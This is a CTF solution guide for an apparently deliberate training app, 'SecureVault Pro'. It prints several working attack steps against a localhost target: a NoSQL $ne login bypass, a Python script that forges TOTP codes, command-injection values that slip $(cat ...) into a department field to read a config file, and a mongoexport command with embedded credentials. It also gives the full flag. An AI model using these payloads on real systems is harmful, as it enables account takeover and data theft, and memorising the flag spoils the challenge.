# SecureVault Pro - Solution Guide

## Challenge Overview
**Flag:** `CTF{n0sql_2fa_byp4ss_m4st3r_2024}`

The flag is split into three parts:
1. HTML comment in admin panel: `CTF{n0sql_`
2. Admin user metadata in database: `2fa_byp4ss_`
3. System config file: `m4st3r_2024}`

## Stage 1: Discovery & NoSQL Injection

### 1.1 Reconnaissance

First, explore the application and look for hidden endpoints:

```bash
# Check common API endpoints
curl http://localhost:3000/api/v2/info

# Try health endpoints with different User-Agents
curl http://localhost:3000/api/v2/health/status
curl http://localhost:3000/api/v2/health/detailed

# The detailed endpoint requires specific User-Agent
curl -H "User-Agent: SecureVault-HealthCheck/2.0" \
     http://localhost:3000/api/v2/health/detailed
```

This reveals the database schema including field names.

### 1.2 NoSQL Injection

The login endpoint is vulnerable to NoSQL injection through the spread operator:

```bash
# Exploit using $ne (not equal) operator
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'
```

Response reveals admin user details:
```json
{
  "success": true,
  "sessionId": "...",
  "email": "admin@securevault.local",
  "requiresTwoFactor": true,
  "role": "admin",
  "metadata": {
    "secretNote": "2fa_byp4ss_"  // Flag part 2!
  }
}
```

## Stage 2: 2FA Bypass

### 2.1 Analyze TOTP Implementation

The TOTP secret is generated deterministically using PBKDF2 with:
- Email as password
- Static salt: "SV2024Q4"
- Low iterations: 1000
- Additional XOR with MD5 hash of email

### 2.2 Generate Valid OTP

Python script to generate valid OTP:

```python
import hashlib
import hmac
import time
import struct
import base64

def generate_totp_secret(email):
    # Replicate the backend's deterministic generation
    salt = bytes.fromhex('535632303234513'.encode().hex() + '4')  # 'SV2024Q4'
    
    # PBKDF2 with low iterations
    import hashlib
    dk = hashlib.pbkdf2_hmac('sha256', email.encode(), salt, 1000, dklen=32)
    
    # XOR with MD5 hash
    md5_hash = hashlib.md5(email.encode()).digest()
    result = bytearray(dk)
    for i in range(min(len(md5_hash), len(result))):
        result[i] ^= md5_hash[i]
    
    # Base32 encode first 20 bytes
    import base64
    return base64.b32encode(result[:20]).decode()

def generate_otp(secret):
    # Standard TOTP implementation
    import pyotp
    totp = pyotp.TOTP(secret)
    return totp.now()

# Generate OTP for admin
email = "admin@securevault.local"
secret = generate_totp_secret(email)
otp = generate_otp(secret)
print(f"Valid OTP: {otp}")
```

### 2.3 Submit OTP

```bash
# Use the session ID from Stage 1
SESSION_ID="<session_id_from_stage_1>"
OTP="123456"  # Generated from script

curl -X POST http://localhost:3000/api/auth/verify-2fa \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "'$SESSION_ID'",
    "token": "'$OTP'"
  }'
```

Response contains JWT token for admin access.

## Stage 3: Admin Panel Exploitation

### 3.1 Access Admin Panel

```bash
JWT_TOKEN="<jwt_from_stage_2>"

# Access admin dashboard
curl -H "Authorization: Bearer $JWT_TOKEN" \
     http://localhost:3000/api/admin/dashboard

# Get system info (contains flag part 3 reference)
curl -H "Authorization: Bearer $JWT_TOKEN" \
     http://localhost:3000/api/admin/system-info
```

### 3.2 Command Injection

The export feature has a vulnerable sanitizer that doesn't filter `${}` or `$()`:

```bash
# Exploit using ${} syntax (not filtered by sanitizer)
curl -X POST http://localhost:3000/api/admin/export-employees \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "csv",
    "department": "engineering${`cat /var/lib/securevault/.config`}"
  }'

# Or using $() syntax
curl -X POST http://localhost:3000/api/admin/export-employees \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "csv",
    "department": "engineering$(cat /var/lib/securevault/.config)"
  }'
```

### 3.3 Retrieve Flag Parts

1. **Part 1**: In admin.html (HTML comment)
   ```html
   <!-- Part 1 of flag: CTF{n0sql_ -->
   ```

2. **Part 2**: From Stage 1 response (metadata.secretNote)
   ```
   2fa_byp4ss_
   ```

3. **Part 3**: From command injection reading .config file
   ```json
   {
     "suffix": "m4st3r_2024}"
   }
   ```

**Complete Flag:** `CTF{n0sql_2fa_byp4ss_m4st3r_2024}`

## Alternative Approaches

### Direct Database Access
If you achieve command execution, you can also extract data directly:

```bash
# Connect to MongoDB
mongoexport --uri="mongodb://svadmin:sv2024prod@mongodb:27017/securevault_prod?authSource=admin" \
            --collection=users --query='{"role":"admin"}'
```

### Timing Attack on TOTP
The large time window (8 periods = 4 minutes) allows for brute force attempts.

## Key Vulnerabilities Exploited

1. **Information Disclosure**: Hidden debug endpoint with specific User-Agent
2. **NoSQL Injection**: Unsanitized spread operator in login
3. **Weak TOTP**: Deterministic secret generation
4. **Command Injection**: Incomplete input sanitization (missing ${} and $())
5. **Excessive Time Window**: 8 TOTP periods = 4 minutes

## Prevention

- Sanitize all user inputs before database queries
- Use truly random TOTP secrets
- Implement proper input validation
- Minimize TOTP time windows
- Remove debug endpoints in production